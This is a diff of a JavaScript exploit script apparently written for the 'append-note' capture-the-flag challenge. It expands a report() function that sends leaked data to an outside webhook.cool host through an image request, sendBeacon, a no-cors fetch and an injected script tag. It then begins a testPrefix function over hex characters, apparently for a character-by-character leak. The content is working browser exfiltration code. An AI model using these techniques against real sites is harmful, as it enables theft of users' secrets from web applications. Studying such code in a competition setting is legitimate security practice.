@@ -8,14 +8,31 @@ var TARGET = "https://append-note-298af.instancer.lac.tf";
 var WEBHOOK = "https://polite-eagle-84.webhook.cool";
 var CHARS = "0123456789abcdef";
 
-// Report using multiple methods
+// Report using multiple methods - try everything
 function report(msg) {
-    try { navigator.sendBeacon(WEBHOOK, msg); } catch(e) {}
-    try { new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg); } catch(e) {}
-    try { fetch(WEBHOOK + "?f=" + encodeURIComponent(msg), {mode:'no-cors'}); } catch(e) {}
+    var encoded = encodeURIComponent(msg);
+    
+    // Method 1: Image
+    try { 
+        var img = new Image();
+        img.src = WEBHOOK + "?i=" + encoded + "&t=" + Date.now();
+    } catch(e) {}
+    
+    // Method 2: sendBeacon
+    try { navigator.sendBeacon(WEBHOOK + "?b=" + encoded, msg); } catch(e) {}
+    
+    // Method 3: fetch no-cors
+    try { fetch(WEBHOOK + "?f=" + encoded, {mode:'no-cors'}); } catch(e) {}
+    
+    // Method 4: Script tag
+    try {
+        var s = document.createElement('script');
+        s.src = WEBHOOK + "?s=" + encoded;
+        document.body.appendChild(s);
+    } catch(e) {}
 }
 
-report("LOAD_V4");
+report("LOAD_V5");
 
 // Use link click instead of form submit 
 function testPrefix(prefix) {
